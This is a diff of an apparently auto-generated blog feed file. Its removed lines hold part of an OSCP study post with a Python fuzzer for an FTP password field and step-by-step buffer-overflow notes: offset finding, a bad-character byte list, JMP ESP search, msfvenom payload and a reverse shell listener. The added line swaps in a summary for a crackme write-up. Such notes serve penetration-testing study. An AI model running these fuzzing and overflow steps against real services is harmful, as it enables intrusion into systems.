-    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Fuzzing PASS with &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s bytes&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
-    &lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'IP address'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# Change IP and port!
-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'USER test&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'PASS '&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'QUIT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
-    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;2.) We need to figure out where the program crashed. Use &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [size]&lt;/code&gt;, where size is a possible size that crashed the program in the previous step. This program will create a string that you should use as input into the program. After sending the string to the program, view it in a debugger, and copy the value of EIP right when the program crashed. You can then use &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l [size] -q [EIP's value]&quot;&lt;/code&gt; to discover the precise location where you can rewrite EIP.&lt;/p&gt;
-
-&lt;p&gt;3.) We need to check for bad characters, which are characters that should not be in your shellcode because they could delete part of your string (such as the \x00 character, which terminates strings in C). Below, there is a list of characters.&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot; 
-&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot; 
-&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot; 
-&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot; 
-&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot; 
-&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot; 
-&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot; 
-&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot; 
-&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot; 
-&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot; 
-&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot; 
-&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot; 
-&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot; 
-&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot; 
-&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot; 
-&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Send the whole string to the vulnerable application. If one of the character is a badchar, then it will delete the rest of the string or not show up. Gradually delete values that are badchars until the whole string is able to be sent, and make sure you keep a list of badchars that have been deleted.&lt;/p&gt;
-
-&lt;p&gt;4.) We need to find some instruction that says “JMP ESP” so that we can just jump to the location our input and start executing code. Use the &lt;code class=&quot;highlighter-rouge&quot;&gt;!mona modules&lt;/code&gt; command in Immunity to find DLLs that have Rebase, SafeSEH, ASLR, and NXCompat set to false (which basically means that the DLL will always load at the same address). Once you find a good DLL, use the follwing command to find a JMP ESP command: &lt;code class=&quot;highlighter-rouge&quot;&gt;!mona find -s &quot;\xff\xe4&quot; -m [DLL's file name]&lt;/code&gt;. Note that the hex equivalent of JMP ESP is \xff\xe4, but you may have to modify this depending on your machine. This command will return a list of pointers to a JMP ESP instruction; select one that does not have any bad characters. If you’re using EDB, open up the OpcodeSearcher plugin, set the Jump Equivalent value to ESP-&amp;gt;EIP, and hit find. Confirm that the JMP works by setting a breakpoint at that location and setting EIP equal to that address of the jump instruction using the buffer overflow.&lt;/p&gt;
-
-&lt;p&gt;5.) Develop a payload using msfvenom that does not contain any bad characters.&lt;/p&gt;
-
-&lt;p&gt;6.) After you create the payload, sometimes you may have to execute some extra code before running the payload, in which case, you can use /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb to quickly write assembly code. You may also want to put a NOP sled at the beginning of your code if there is space.&lt;/p&gt;
-
-&lt;p&gt;7.) Setup a reverse shell listener. Create your final exploit and run it.&lt;/p&gt;
-
-&lt;section class=&quot;related&quot;&gt;
-  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
-  &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
@@ -2427,11 +2160,5 @@ exploit
         &lt;/a&gt;
       &lt;/li&gt;
     
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/10/14/return-oriented-programming-tutorial.html&quot;&gt;
-          Return Oriented Programming Tutorial
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
   &lt;/ul&gt;
-&lt;/section&gt;</content><author><name></name></author><summary type="html">I have been studying for the OSCP for a little less than two months. I was studying 5-7 hours per day during my winter break, and I’ve learned a lot since I began. At the time of writing this blog post, my exam is in a week, and I just wanted to put down some of my notes that I’ve been using into a blog post. These notes mainly contain commands that I have been using throughout the PWK labs.</summary></entry></feed>
+&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be going over how I cracked this crackme. When I first executed the program, it started off by asking me to enter some password, so it is clear that our goal here is to figure out what this password is.</summary></entry></feed>
